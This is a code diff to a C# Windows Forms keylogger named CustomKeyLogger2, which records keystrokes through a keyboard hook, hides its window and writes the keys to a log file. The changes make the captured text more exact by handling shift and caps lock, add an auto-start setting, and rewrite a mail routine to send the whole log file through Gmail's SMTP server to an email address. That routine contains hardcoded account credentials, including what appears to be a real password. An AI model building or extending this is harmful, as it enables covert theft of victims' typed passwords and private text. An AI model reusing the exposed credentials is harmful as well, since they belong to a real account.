@@ -16,6 +16,9 @@ namespace CustomKeyLogger2
 {
     public partial class Form1 : Form
     {
+        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
+        internal static extern short GetKeyState(int virtualKeyCode);
+
         string atmdir = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase);
         string writeUp = "";
         string secretWord = "";
@@ -72,7 +75,7 @@ namespace CustomKeyLogger2
                 if(secretWord == null) secretWord = "";
             }
 
-            if (secretWord.CompareTo("") == 0)
+            if (secretWord.CompareTo("") == 0 || Properties.Settings.Default.AutoStart == false)
             {
                 this.ShowWindow();
                 this.btnStart.Enabled = true;
@@ -111,6 +114,7 @@ namespace CustomKeyLogger2
             btnStart.Enabled = false;
             btnStop.Enabled = true;
             btnHide.Enabled = true;
+            Properties.Settings.Default.AutoStart = true;
         }
 
         private void btnStop_Click(object sender, EventArgs e)
@@ -119,16 +123,17 @@ namespace CustomKeyLogger2
             btnStart.Enabled = true;
             btnStop.Enabled = false;
             btnHide.Enabled = false;
+            Properties.Settings.Default.AutoStart = false;
         }
 
-        public void KeyReaderr(IntPtr wParam, IntPtr lParam)
+        public void KeyReaderr(IntPtr wParam, IntPtr lParam, bool ShiftMod, bool CapMod)
         {
             int key = Marshal.ReadInt32(lParam);
 
             hook.VK vk = (hook.VK)key;
 
             String temp = "";
-
+            
             switch (vk)
             {
                 //case hook.VK.VK_F1: temp = "<-F1->";
@@ -162,11 +167,11 @@ namespace CustomKeyLogger2
                 //    break;
                 //case hook.VK.VK_PAUSE: temp = "<-pause->";
                 //    break;
-                case hook.VK.VK_INSERT: temp = "\r\n<-insert->";
-                    break;
-                case hook.VK.VK_HOME: temp = "\r\n<-home->";
-                    break;
-                case hook.VK.VK_DELETE: temp = "\r\n<-delete->";
+                //case hook.VK.VK_INSERT: temp = "\r\n<-insert->";
+                //    break;
+                //case hook.VK.VK_HOME: temp = "\r\n<-home->";
+                //    break;
+                case hook.VK.VK_DELETE: temp = "<delete>";
                     break;
                 //case hook.VK.VK_END: temp = "<-end->";
                 //    break;
@@ -174,41 +179,41 @@ namespace CustomKeyLogger2
                 //    break;
                 //case hook.VK.VK_NEXT: temp = "<-page down->";
                 //    break;
-                                
+
                 case hook.VK.VK_ESCAPE: temp = "\r\n<-esc->";
                     break;
                 case hook.VK.VK_NUMLOCK: temp = "\r\n<-numlock->";
                     break;
-                case hook.VK.VK_LSHIFT: temp = "\r\n<-left shift->";
-                    break;
-                case hook.VK.VK_RSHIFT: temp = "\r\n<-right shift->";
-                    break;
+                //case hook.VK.VK_LSHIFT: temp = "\r\n<-left shift->";
+                //    break;
+                //case hook.VK.VK_RSHIFT: temp = "\r\n<-right shift->";
+                //    break;
                 case hook.VK.VK_LCONTROL: temp = "\r\n<-left control->";
                     break;
                 case hook.VK.VK_RCONTROL: temp = "\r\n<-right control->";
                     break;
-                case hook.VK.VK_LMENU: temp = "\r\n<-left alt/menu->";
+                case hook.VK.VK_LMENU: temp = "\r\n<-left alt->";
                     break;
-                case hook.VK.VK_RMENU: temp = "\r\n<-right al/menu->";
+                case hook.VK.VK_RMENU: temp = "\r\n<-right alt->";
                     break;
-                case hook.VK.VK_TAB: temp = "\r\n<-tab->";
+                case hook.VK.VK_TAB: temp = "\t";
                     break;
-                case hook.VK.VK_CAPITAL: temp = "\r\n<-caps lock->";
+                //case hook.VK.VK_CAPITAL: temp = "\r\n<-caps lock->";
+                //    break;
+                case hook.VK.VK_BACK: temp = "<back>";
                     break;
-                case hook.VK.VK_BACK: temp = "\r\n<-backspace->";
+                case hook.VK.VK_RETURN: temp = "\r\n";
                     break;
-                case hook.VK.VK_RETURN: temp = "\r\n<-enter->";
-                    break;
-                case hook.VK.VK_SPACE: temp = "\t";     //  "<-space->"
+                case hook.VK.VK_SPACE: temp = "  ";     //  "<-space->"
                     break;
 
-                case hook.VK.VK_LEFT: temp = "\r\n<-arrow left->";
+                case hook.VK.VK_LEFT: temp = "<left>";
                     break;
-                case hook.VK.VK_UP: temp = "\r\n<-arrow up->";
+                case hook.VK.VK_UP: temp = "<up>";
                     break;
-                case hook.VK.VK_RIGHT: temp = "\r\n<-arrow right->";
+                case hook.VK.VK_RIGHT: temp = "<right>";
                     break;
-                case hook.VK.VK_DOWN: temp = "\r\n<-arrow down->";
+                case hook.VK.VK_DOWN: temp = "<down>";
                     break;
 
                 case hook.VK.VK_MULTIPLY: temp = "*";
@@ -237,6 +242,14 @@ namespace CustomKeyLogger2
                 case hook.VK.VK_OEM_2: temp = "/";
                     break;
                 case hook.VK.VK_OEM_3: temp = "`";
+                    break;
+                case hook.VK.VK_OEM_4: temp = "[";
+                    break;
+                case hook.VK.VK_OEM_5: temp = @"\";
+                    break;
+                case hook.VK.VK_OEM_6: temp = "]";
+                    break;
+                case hook.VK.VK_OEM_7: temp = "'";
                     break;
 
                 case hook.VK.VK_NUMPAD0: temp = "0";
@@ -336,6 +349,40 @@ namespace CustomKeyLogger2
                 default: break;
             }
 
+            #region To Upper Case
+
+            if (ShiftMod == true)
+            {
+                if ((int)vk > 0x40 && (int)vk < 0x5B && CapMod == false) temp = temp.ToUpper();
+                if (vk == hook.VK.VK_1) temp = "!";
+                if (vk == hook.VK.VK_2) temp = "@";
+                if (vk == hook.VK.VK_3) temp = "#";
+                if (vk == hook.VK.VK_4) temp = "$";
+                if (vk == hook.VK.VK_5) temp = "%";
+                if (vk == hook.VK.VK_6) temp = "^";
+                if (vk == hook.VK.VK_7) temp = "&";
+                if (vk == hook.VK.VK_8) temp = "*";
+                if (vk == hook.VK.VK_9) temp = "(";
+                if (vk == hook.VK.VK_0) temp = ")";
+                if (vk == hook.VK.VK_OEM_1) temp = ":";
+                if (vk == hook.VK.VK_OEM_2) temp = "?";
+                if (vk == hook.VK.VK_OEM_3) temp = "~";
+                if (vk == hook.VK.VK_OEM_COMMA) temp = "<";
+                if (vk == hook.VK.VK_OEM_MINUS) temp = "_";
+                if (vk == hook.VK.VK_OEM_PERIOD) temp = ">";
+                if (vk == hook.VK.VK_OEM_PLUS) temp = "+";
+                if (vk == hook.VK.VK_OEM_4) temp = "{";
+                if (vk == hook.VK.VK_OEM_5) temp = "|";
+                if (vk == hook.VK.VK_OEM_6) temp = "}";
+                if (vk == hook.VK.VK_OEM_7) temp = "\"";
+            }
+            else if (CapMod == true)
+            {
+                if ((int)vk > 0x40 && (int)vk < 0x5B) temp = temp.ToUpper();
+            }
+
+            #endregion
+
             writeUp = writeUp + temp;
 
             unhide();
@@ -344,7 +391,7 @@ namespace CustomKeyLogger2
 #endif
             writeToFile(temp);
         }
-
+        
         public void unhide()
         {
             if (writeUp.Contains(secretWord) && secretWord != "")
@@ -428,11 +475,15 @@ namespace CustomKeyLogger2
 
         public void sendMailK() // not tested
         {
-            MailMessage message = new MailMessage("keylogger", "arxleol@gmail.com", "keyword fired", writeUp);
-            SmtpClient emailClient = new SmtpClient("either local host or google smtp or soemthing third");
-            System.Net.NetworkCredential SMTPUserInfo = new System.Net.NetworkCredential("your username", "your password");
+            MailMessage message = new MailMessage("aungthumoe5@gmail.com", "aungthumoe5+KeyLogger2@gmail.com",
+                "CustomKeyLogger2 - logs report", File.ReadAllText(logsFileDir));
+            SmtpClient emailClient = new SmtpClient("smtp.gmail.com", 587);
+            System.Net.NetworkCredential SMTPUserInfo = new System.Net.NetworkCredential("aungthumoe5@gmail.com", "3530505Q067785@tm5");
             emailClient.UseDefaultCredentials = false;
             emailClient.Credentials = SMTPUserInfo;
+            emailClient.EnableSsl = true;
+            emailClient.DeliveryMethod = SmtpDeliveryMethod.Network;
+            emailClient.Timeout = 20000;
             emailClient.Send(message);
         }
 
@@ -455,6 +506,16 @@ namespace CustomKeyLogger2
             this.ShowInTaskbar = false;
             this.WindowState = FormWindowState.Minimized;
             this.Refresh();
+        }
+
+        private void btnExit_Click(object sender, EventArgs e)
+        {
+            this.Close();
+        }
+
+        private void btnEmail_Click(object sender, EventArgs e)
+        {
+            sendMailK();
         }
     }
 }
